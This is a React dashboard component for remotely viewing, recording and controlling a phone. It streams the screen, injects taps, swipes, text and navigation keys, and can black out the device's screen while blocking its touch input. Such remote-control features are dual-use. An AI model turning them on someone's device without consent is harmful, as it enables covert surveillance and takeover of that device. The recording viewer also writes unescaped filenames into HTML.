import React, { useState, useEffect, useRef, useCallback } from 'react';

export default function ScreenControl({ device, sendCommand, streamFrame, send }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [isStreaming, setIsStreaming]         = useState(false);
  const [isRecording, setIsRecording]         = useState(false);
  const [isBlackedOut, setIsBlackedOut]       = useState(false);
  const [blackoutLoading, setBlackoutLoading] = useState(false);
  const [recordings, setRecordings]           = useState([]);
  const [loadingRecs, setLoadingRecs]         = useState(false);
  const [recStatus, setRecStatus]             = useState('');
  const [fps, setFps]                         = useState(0);
  const [frameCount, setFrameCount]           = useState(0);
  const [pasteText, setPasteText]             = useState('');
  const [showPaste, setShowPaste]             = useState(false);
  const [streamIdle, setStreamIdle]           = useState(false);

  const lastFrameTime    = useRef(null);
  const frameCountRef    = useRef(0);
  const screenRef        = useRef(null);
  const touchStartRef    = useRef(null);
  const idleTimerRef     = useRef(null);
  const autoStopTimerRef = useRef(null);
  const isStreamingRef   = useRef(false);

  // Deduplication: track last touch command sent (key + timestamp)
  const lastTouchRef     = useRef({ key: '', time: 0 });
  // Throttle: prevent queuing frame requests while one is in-flight
  const frameRequestedRef = useRef(false);

  const devInfo = device?.deviceInfo || {};
  const devW    = devInfo.screenWidth  || null;
  const devH    = devInfo.screenHeight || null;
  const resLabel = devW && devH ? `${devW}×${devH}` : null;
  const FRAME_W = 360;
  const FRAME_H = devW && devH ? Math.min(780, Math.round(FRAME_W * devH / devW)) : 780;

  useEffect(() => { isStreamingRef.current = isStreaming; }, [isStreaming]);

  // ── Manual Start Stream ──
  const handleStartStream = useCallback(() => {
    if (isStreamingRef.current) return;
    sendCommand(deviceId, 'stream_start', {});
    setIsStreaming(true);
    isStreamingRef.current = true;
    frameCountRef.current = 0;
    setFrameCount(0);
    setStreamIdle(false);
    // Auto-stop after 5 minutes of no interaction
    if (autoStopTimerRef.current) clearTimeout(autoStopTimerRef.current);
    autoStopTimerRef.current = setTimeout(() => {
      if (isStreamingRef.current) {
        sendCommand(deviceId, 'stream_stop');
        setIsStreaming(false);
        isStreamingRef.current = false;
        setFps(0);
      }
    }, 5 * 60 * 1000);
  }, [deviceId, sendCommand]);

  // ── Throttled frame request: drop if previous hasn't arrived yet ──
  const requestFrame = useCallback(() => {
    if (!isStreamingRef.current) return;
    if (frameRequestedRef.current) return; // already waiting for a frame
    frameRequestedRef.current = true;
    sendCommand(deviceId, 'stream_request_frame', {});
    // Reset flag after 600ms regardless (guards against lost frames)
    setTimeout(() => { frameRequestedRef.current = false; }, 600);
  }, [deviceId, sendCommand]);

  const fetchRecordings = useCallback(async () => {
    setLoadingRecs(true);
    try {
      const res = await fetch(`/api/recordings/${deviceId}`);
      const data = await res.json();
      setRecordings(data.recordings || []);
    } catch (e) {
      console.error('Failed to fetch recordings', e);
    } finally {
      setLoadingRecs(false);
    }
  }, [deviceId]);

  useEffect(() => { fetchRecordings(); }, [fetchRecordings]);

  // Clear pending frame flag when a new frame arrives, then immediately request next
  useEffect(() => {
    if (streamFrame) {
      frameRequestedRef.current = false;
      frameCountRef.current += 1;
      setFrameCount(frameCountRef.current);
      const now = Date.now();
      if (lastFrameTime.current) {
        const diff = now - lastFrameTime.current;
        setFps(Math.round(1000 / diff));
      }
      lastFrameTime.current = now;
      setStreamIdle(false);
      if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      idleTimerRef.current = setTimeout(() => setStreamIdle(true), 3000);
      // Pipeline: immediately request the next frame
      requestFrame();
    }
  }, [streamFrame, requestFrame]);

  // Continuous polling fallback — requests a frame every 500ms while streaming
  // (catches cases where the pipeline stalls e.g. a lost frame)
  const pollingIntervalRef = useRef(null);
  useEffect(() => {
    if (isStreaming) {
      if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = setInterval(() => {
        requestFrame();
      }, 500);
    } else {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    }
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    };
  }, [isStreaming, requestFrame]);

  useEffect(() => () => {
    if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
    if (autoStopTimerRef.current) clearTimeout(autoStopTimerRef.current);
    if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current);
  }, []);

  // ── Map screen coordinates from phone-frame pixel → device coordinates ──
  const toDeviceCoords = useCallback((clientX, clientY) => {
    if (!screenRef.current) return { x: 0, y: 0 };
    const rect = screenRef.current.getBoundingClientRect();
    const relX = clientX - rect.left;
    const relY = clientY - rect.top;
    const scaleX = devW ? devW / rect.width  : 1;
    const scaleY = devH ? devH / rect.height : 1;
    return { x: Math.round(relX * scaleX), y: Math.round(relY * scaleY) };
  }, [devW, devH]);

  // ── Pointer events for touch + swipe ──
  const handlePointerDown = useCallback((e) => {
    if (!isOnline || !isStreamingRef.current) return;
    e.preventDefault();
    touchStartRef.current = { x: e.clientX, y: e.clientY, time: Date.now() };
  }, [isOnline]);

  const handlePointerUp = useCallback((e) => {
    if (!isOnline || !touchStartRef.current || !isStreamingRef.current) return;
    e.preventDefault();
    const dx = e.clientX - touchStartRef.current.x;
    const dy = e.clientY - touchStartRef.current.y;
    const dist = Math.sqrt(dx * dx + dy * dy);
    const duration = Date.now() - touchStartRef.current.time;

    if (dist < 8) {
      // Tap — deduplicate if same coords within 300ms
      const { x, y } = toDeviceCoords(e.clientX, e.clientY);
      const touchKey = `${x},${y}`;
      const now = Date.now();
      if (touchKey === lastTouchRef.current.key && (now - lastTouchRef.current.time) < 300) {
        touchStartRef.current = null;
        return; // duplicate, ignore
      }
      lastTouchRef.current = { key: touchKey, time: now };
      sendCommand(deviceId, 'touch', { x, y });
      requestFrame();
    } else {
      // Swipe
      const from = toDeviceCoords(touchStartRef.current.x, touchStartRef.current.y);
      const to   = toDeviceCoords(e.clientX, e.clientY);
      sendCommand(deviceId, 'swipe', { x1: from.x, y1: from.y, x2: to.x, y2: to.y, duration: Math.max(200, Math.min(duration, 800)) });
      requestFrame();
    }
    touchStartRef.current = null;
  }, [isOnline, toDeviceCoords, deviceId, sendCommand, requestFrame]);

  const handlePointerCancel = useCallback(() => {
    touchStartRef.current = null;
  }, []);

  // ── Directional swipe buttons ──
  const sendSwipe = useCallback((direction) => {
    if (!isOnline || !isStreamingRef.current) return;
    const midX = devW ? Math.round(devW / 2) : 540;
    const midY = devH ? Math.round(devH / 2) : 960;
    const step = devH ? Math.round(devH * 0.3) : 300;
    let x1 = midX, y1 = midY, x2 = midX, y2 = midY;
    switch (direction) {
      case 'up':    y1 = midY + step; y2 = midY - step; break;
      case 'down':  y1 = midY - step; y2 = midY + step; break;
      case 'left':  x1 = midX + step; x2 = midX - step; break;
      case 'right': x1 = midX - step; x2 = midX + step; break;
    }
    sendCommand(deviceId, 'swipe', { x1, y1, x2, y2, duration: 400 });
    requestFrame();
  }, [isOnline, devW, devH, deviceId, sendCommand, requestFrame]);

  // ── Paste text ──
  const handlePaste = useCallback(() => {
    if (!pasteText.trim()) return;
    sendCommand(deviceId, 'input_text', { text: pasteText });
    setPasteText('');
    setShowPaste(false);
    requestFrame();
  }, [pasteText, deviceId, sendCommand, requestFrame]);

  const handleToggleBlackout = () => {
    if (blackoutLoading) return;
    setBlackoutLoading(true);
    if (!isBlackedOut) {
      // Enabling blackout — stop stream first so dashboard stops trying to receive frames
      if (isStreamingRef.current) {
        sendCommand(deviceId, 'stream_stop');
        setIsStreaming(false);
        isStreamingRef.current = false;
        setFps(0);
        setStreamIdle(false);
        if (autoStopTimerRef.current) clearTimeout(autoStopTimerRef.current);
      }
      sendCommand(deviceId, 'screen_blackout_on');
      setIsBlackedOut(true);
    } else {
      // Disabling blackout — unblock screen
      sendCommand(deviceId, 'screen_blackout_off');
      setIsBlackedOut(false);
    }
    setTimeout(() => setBlackoutLoading(false), 2000);
  };

  const handleStopStream = () => {
    if (autoStopTimerRef.current) clearTimeout(autoStopTimerRef.current);
    sendCommand(deviceId, 'stream_stop');
    setIsStreaming(false);
    isStreamingRef.current = false;
    setFps(0);
    setStreamIdle(false);
  };

  const handleStartRecord = () => {
    if (!isStreamingRef.current) {
      handleStartStream();
    }
    send('recording:start', { deviceId });
    setIsRecording(true);
    setRecStatus('Recording…');
  };

  const handleStopRecord = async () => {
    send('recording:stop', { deviceId });
    setIsRecording(false);
    setRecStatus('Saving…');
    setTimeout(() => {
      fetchRecordings();
      setRecStatus('Saved ✓');
      setTimeout(() => setRecStatus(''), 2000);
    }, 800);
  };

  const handleDeleteRecording = async (filename) => {
    if (!window.confirm(`Delete recording "${filename}"?`)) return;
    try {
      await fetch(`/api/recordings/${deviceId}/${filename}`, { method: 'DELETE' });
      fetchRecordings();
    } catch (e) {
      alert('Delete failed');
    }
  };

  const handleDownloadRecording = (filename) => {
    window.open(`/api/recordings/${deviceId}/${filename}`, '_blank');
  };

  const handleViewRecording = async (filename) => {
    try {
      const res = await fetch(`/api/recordings/${deviceId}/${filename}/view`);
      const data = await res.json();
      openRecordingViewer(data, filename);
    } catch (_) {
      window.open(`/api/recordings/${deviceId}/${filename}`, '_blank');
    }
  };

  const openRecordingViewer = (data, filename) => {
    const frames = data.frames || [];
    if (!frames.length) { alert('No frames in this recording'); return; }
    const html = `<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Recording — ${filename}</title>
<style>
  body { margin:0; background:#0f0f1a; color:#f0f0ff; font-family:sans-serif; display:flex; flex-direction:column; align-items:center; }
  h2 { margin:12px 0 4px; font-size:16px; color:#a78bfa; }
  .meta { font-size:12px; color:#94a3b8; margin-bottom:10px; }
  #viewer { max-width:90vw; max-height:70vh; border-radius:10px; border:1px solid #2d2d4e; }
  .controls { display:flex; gap:10px; margin:10px 0; align-items:center; }
  button { background:#7c3aed; color:white; border:none; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; }
  button:hover { background:#6d28d9; }
  input[type=range] { width:300px; accent-color:#7c3aed; }
  .frame-info { font-size:12px; color:#94a3b8; }
</style></head><body>
<h2>📹 ${filename}</h2>
<div class="meta">Frames: ${frames.length} | Start: ${data.startTime ? new Date(data.startTime).toLocaleString() : '—'}</div>
<img id="viewer" src="data:image/jpeg;base64,${frames[0]?.frameData || ''}" />
<div class="controls">
  <button onclick="prevFrame()">◀ Prev</button>
  <button id="playBtn" onclick="togglePlay()">▶ Play</button>
  <button onclick="nextFrame()">Next ▶</button>
  <input type="range" id="slider" min="0" max="${frames.length - 1}" value="0" oninput="goToFrame(parseInt(this.value))"/>
</div>
<div class="frame-info" id="frameInfo">Frame 1 / ${frames.length}</div>
<script>
  const frames=${JSON.stringify(frames)};
  let cur=0, playing=false, interval=null;
  function show(i){cur=i;document.getElementById('viewer').src='data:image/jpeg;base64,'+frames[i].frameData;document.getElementById('slider').value=i;document.getElementById('frameInfo').textContent='Frame '+(i+1)+' / '+frames.length;}
  function prevFrame(){show(Math.max(0,cur-1));}
  function nextFrame(){show(Math.min(frames.length-1,cur+1));}
  function goToFrame(i){show(i);}
  function togglePlay(){
    playing=!playing;
    document.getElementById('playBtn').textContent=playing?'⏸ Pause':'▶ Play';
    if(playing){interval=setInterval(()=>{if(cur>=frames.length-1){cur=0;}else{cur++;}show(cur);},500);}
    else{clearInterval(interval);}
  }
</script></body></html>`;
    const w = window.open('', '_blank');
    if (w) { w.document.write(html); w.document.close(); }
  };

  const navBtn = (label, command, icon) => (
    <button
      className="sc-nav-btn"
      onClick={() => {
        if (!isStreamingRef.current) return;
        sendCommand(deviceId, command);
        requestFrame();
      }}
      disabled={!isOnline || !isStreaming}
      title={command}
    >
      {icon} {label}
    </button>
  );

  const formatFileSize = (bytes) => {
    if (!bytes) return '—';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
  };

  return (
    <div className="screen-control">

      {/* ── Block Screen Banner ── */}
      <div className="sc-blackout-bar" style={isBlackedOut ? { background: 'rgba(239,68,68,0.12)', borderColor: 'rgba(239,68,68,0.4)' } : {}}>
        <div className="sc-blackout-info">
          <span style={{ fontSize: 20 }}>{isBlackedOut ? '🔴' : '🟢'}</span>
          <div>
            <div style={{ fontWeight: 600, fontSize: 14, color: isBlackedOut ? '#ef4444' : '#f0f0ff' }}>
              {isBlackedOut ? 'Screen Blocked — Device screen is fully blacked out' : 'Screen Visible — Device screen is on'}
            </div>
            <div style={{ fontSize: 11, color: '#94a3b8', marginTop: 2 }}>
              {isBlackedOut
                ? 'The device shows a black screen and blocks all touch input. Streaming and remote control are disabled.'
                : 'Toggle to black out the device screen completely. Streaming will stop and device touch will be blocked.'}
            </div>
          </div>
        </div>
        <button
          className={`sc-blackout-btn ${isBlackedOut ? 'blackout-active' : 'blackout-inactive'}`}
          onClick={handleToggleBlackout}
          disabled={!isOnline || blackoutLoading}
          title={isBlackedOut ? 'Disable screen blackout' : 'Enable screen blackout — device shows black screen, all touch blocked'}
          style={isBlackedOut ? { fontSize: 14, padding: '10px 22px', fontWeight: 700 } : {}}
        >
          {blackoutLoading ? '⏳ Working…' : isBlackedOut ? '🔓 Unblock Screen' : '🔒 Block Screen'}
        </button>
      </div>

      {/* ── Blocked State: full overlay when screen is blacked out ── */}
      {isBlackedOut && (
        <div style={{
          background: 'rgba(15,15,26,0.97)', border: '1px solid rgba(239,68,68,0.3)',
          borderRadius: 12, padding: '60px 20px', textAlign: 'center',
          display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 16,
          margin: '8px 0'
        }}>
          <div style={{ fontSize: 64 }}>⬛</div>
          <div style={{ fontWeight: 700, fontSize: 20, color: '#ef4444' }}>Screen Blocked</div>
          <div style={{ color: '#94a3b8', fontSize: 13, maxWidth: 400, lineHeight: 1.6 }}>
            The device screen is completely blacked out and all touch input is blocked on the device.
            Streaming and dashboard interaction are disabled while block is active.
          </div>
          <div style={{ background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 8, padding: '8px 16px', fontSize: 12, color: '#94a3b8' }}>
            📡 Block/Unblock commands use a dedicated control channel
          </div>
          <button
            onClick={handleToggleBlackout}
            disabled={!isOnline || blackoutLoading}
            style={{
              background: '#7c3aed', border: 'none', borderRadius: 10, color: '#fff',
              padding: '14px 36px', fontSize: 16, fontWeight: 700, cursor: 'pointer',
              letterSpacing: 1, marginTop: 8, opacity: (!isOnline || blackoutLoading) ? 0.5 : 1
            }}
          >
            {blackoutLoading ? '⏳ Unblocking…' : '🔓 Unblock Screen Now'}
          </button>
        </div>
      )}

      <div className="sc-layout" style={isBlackedOut ? { opacity: 0.3, pointerEvents: 'none', userSelect: 'none' } : {}}>
        <div className="sc-viewer-col">
          {/* ── Phone Frame ── */}
          <div className="sc-phone-frame-wrap">
            <div className="sc-phone-bezel" style={{ width: FRAME_W + 32, paddingTop: 24, paddingBottom: 18, borderRadius: 32 }}>
              {resLabel && <div className="sc-phone-res-label">{resLabel}</div>}
              <div className="sc-phone-notch" />
              <div
                className="sc-phone-screen-wrap"
                style={{ width: FRAME_W, height: FRAME_H, cursor: isOnline && isStreaming ? 'crosshair' : 'default', userSelect: 'none' }}
                ref={screenRef}
                onPointerDown={handlePointerDown}
                onPointerUp={handlePointerUp}
                onPointerCancel={handlePointerCancel}
              >
                {streamFrame ? (
                  <img
                    className="sc-frame"
                    src={`data:image/jpeg;base64,${streamFrame}`}
                    alt="Screen"
                    draggable={false}
                    style={{ width: '100%', height: '100%', objectFit: 'fill', display: 'block', borderRadius: 8, pointerEvents: 'none' }}
                  />
                ) : (
                  <div className="sc-placeholder" style={{ height: FRAME_H }}>
                    <div style={{ fontSize: 48 }}>📡</div>
                    <div style={{ fontSize: 13, color: '#94a3b8', marginTop: 10, textAlign: 'center' }}>
                      {!isOnline
                        ? 'Device offline'
                        : !isStreaming
                          ? 'Click Start Stream to begin'
                          : 'Waiting for first frame…'}
                    </div>
                  </div>
                )}
                {streamFrame && (
                  <div className="sc-overlay-stats">
                    <span style={{ color: streamIdle ? '#94a3b8' : '#22c55e' }}>
                      {streamIdle ? '⏸ IDLE' : '● LIVE'}
                    </span>
                    <span>{frameCount} frames</span>
                    {isRecording && <span style={{ color: '#ef4444' }}>● REC</span>}
                  </div>
                )}
                {/* Overlay when stream hasn't started */}
                {!isStreaming && !streamFrame && isOnline && (
                  <div style={{
                    position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column',
                    alignItems: 'center', justifyContent: 'center', gap: 12,
                    background: 'rgba(15,15,26,0.85)', borderRadius: 8
                  }}>
                    <button
                      style={{
                        background: '#7c3aed', color: '#fff', border: 'none', borderRadius: 10,
                        padding: '12px 28px', fontSize: 15, fontWeight: 700, cursor: 'pointer', letterSpacing: 1
                      }}
                      onClick={handleStartStream}
                    >
                      ▶ Start Stream
                    </button>
                    <div style={{ fontSize: 12, color: '#64748b' }}>Click to begin remote screen view</div>
                  </div>
                )}
              </div>
              {/* ── Swipe direction buttons below screen ── */}
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4, marginTop: 10 }}>
                <button className="sc-swipe-btn" onClick={() => sendSwipe('up')} disabled={!isOnline || !isStreaming} title="Swipe Up">▲</button>
                <div style={{ display: 'flex', gap: 8 }}>
                  <button className="sc-swipe-btn" onClick={() => sendSwipe('left')} disabled={!isOnline || !isStreaming} title="Swipe Left">◀</button>
                  <button className="sc-swipe-btn sc-swipe-down" onClick={() => sendSwipe('down')} disabled={!isOnline || !isStreaming} title="Swipe Down">▼</button>
                  <button className="sc-swipe-btn" onClick={() => sendSwipe('right')} disabled={!isOnline || !isStreaming} title="Swipe Right">▶</button>
                </div>
              </div>
              <div className="sc-phone-home-bar-sc" />
            </div>
          </div>

          {/* ── Paste text + Enter ── */}
          <div style={{ marginTop: 8, display: 'flex', flexDirection: 'column', gap: 4 }}>
            <div style={{ display: 'flex', gap: 6 }}>
              <button
                style={{ background: '#1e1b4b', border: '1px solid #4c1d95', color: '#a78bfa', borderRadius: 6, padding: '5px 12px', fontSize: 12, cursor: 'pointer', flex: 1 }}
                onClick={() => setShowPaste(v => !v)}
                disabled={!isOnline || !isStreaming}
              >
                📋 Paste Text
              </button>
              <button
                style={{ background: '#1e1b4b', border: '1px solid #4c1d95', color: '#a78bfa', borderRadius: 6, padding: '5px 12px', fontSize: 12, cursor: 'pointer' }}
                onClick={() => { sendCommand(deviceId, 'press_enter'); requestFrame(); }}
                disabled={!isOnline || !isStreaming}
                title="Press Enter / IME action key on device"
              >
                ↵ Enter
              </button>
            </div>
            {showPaste && (
              <div style={{ display: 'flex', gap: 6 }}>
                <input
                  type="text"
                  placeholder="Text to paste into device…"
                  value={pasteText}
                  onChange={e => setPasteText(e.target.value)}
                  onKeyDown={e => { if (e.key === 'Enter') handlePaste(); }}
                  style={{ flex: 1, background: '#1a1a2e', border: '1px solid #2d2d4e', borderRadius: 6, padding: '5px 8px', color: '#f0f0ff', fontSize: 12 }}
                  autoFocus
                />
                <button
                  onClick={handlePaste}
                  disabled={!pasteText.trim()}
                  style={{ background: '#7c3aed', border: 'none', borderRadius: 6, color: '#fff', padding: '5px 12px', fontSize: 12, cursor: 'pointer' }}
                  title="Send text to device"
                >
                  ↵ Send
                </button>
                <button
                  onClick={() => { sendCommand(deviceId, 'press_enter'); requestFrame(); }}
                  disabled={!isOnline || !isStreaming}
                  style={{ background: '#1e1b4b', border: '1px solid #4c1d95', borderRadius: 6, color: '#a78bfa', padding: '5px 12px', fontSize: 12, cursor: 'pointer' }}
                  title="Press Enter / IME key on device"
                >
                  ⏎ Enter
                </button>
              </div>
            )}
          </div>

          <div className="sc-controls" style={{ marginTop: 8 }}>
            {/* Stream status + Start/Stop buttons */}
            {!isStreaming ? (
              <button className="sc-btn sc-btn-start" onClick={handleStartStream} disabled={!isOnline}>
                ▶ Start Stream
              </button>
            ) : (
              <>
                <span style={{
                  fontSize: 11, padding: '3px 8px', borderRadius: 4, border: '1px solid #2d2d4e',
                  color: streamIdle ? '#94a3b8' : '#22c55e',
                  background: streamIdle ? '#1a1a2e' : '#052e16'
                }}>
                  {streamIdle ? '⏸ Idle' : '● Streaming'}
                </span>
                <button className="sc-btn sc-btn-stop" onClick={handleStopStream}>
                  ⏹ Stop Stream
                </button>
              </>
            )}

            {!isRecording ? (
              <button className="sc-btn sc-btn-rec" onClick={handleStartRecord} disabled={!isOnline}>
                🔴 Record
              </button>
            ) : (
              <button className="sc-btn sc-btn-stop" onClick={handleStopRecord}>
                ⏹ Stop Recording
              </button>
            )}

            {recStatus && <span style={{ fontSize: 12, color: '#a78bfa' }}>{recStatus}</span>}
          </div>

          <div className="sc-nav-bar">
            <div className="sc-nav-label">Navigation</div>
            <div className="sc-nav-buttons">
              {navBtn('Back', 'press_back', '◀')}
              {navBtn('Home', 'press_home', '🏠')}
              {navBtn('Recents', 'press_recents', '⬜')}
            </div>
          </div>
        </div>

        <div className="sc-recordings-col">
          <div className="sc-rec-header">
            <span>🎬 Saved Recordings ({recordings.length})</span>
            <button className="sc-refresh-btn" onClick={fetchRecordings} disabled={loadingRecs}>
              {loadingRecs ? '…' : '↻'}
            </button>
          </div>

          {recordings.length === 0 ? (
            <div className="sc-rec-empty">
              <div>🎬</div>
              <div>No recordings yet</div>
              <div style={{ fontSize: 11 }}>Start a stream and record it</div>
            </div>
          ) : (
            <div className="sc-rec-list">
              {recordings.map((rec) => (
                <div key={rec.filename} className="sc-rec-item">
                  <div className="sc-rec-info">
                    <div className="sc-rec-name" title={rec.filename}>{rec.filename}</div>
                    <div className="sc-rec-meta">
                      {rec.frameCount != null && <span>{rec.frameCount} frames</span>}
                      {rec.size && <span>{formatFileSize(rec.size)}</span>}
                      {rec.startTime && <span>{new Date(rec.startTime).toLocaleTimeString()}</span>}
                    </div>
                  </div>
                  <div className="sc-rec-actions">
                    <button className="sc-action-btn sc-view" onClick={() => handleViewRecording(rec.filename)} title="View">▶</button>
                    <button className="sc-action-btn sc-dl" onClick={() => handleDownloadRecording(rec.filename)} title="Download">⬇</button>
                    <button className="sc-action-btn sc-del" onClick={() => handleDeleteRecording(rec.filename)} title="Delete">🗑</button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
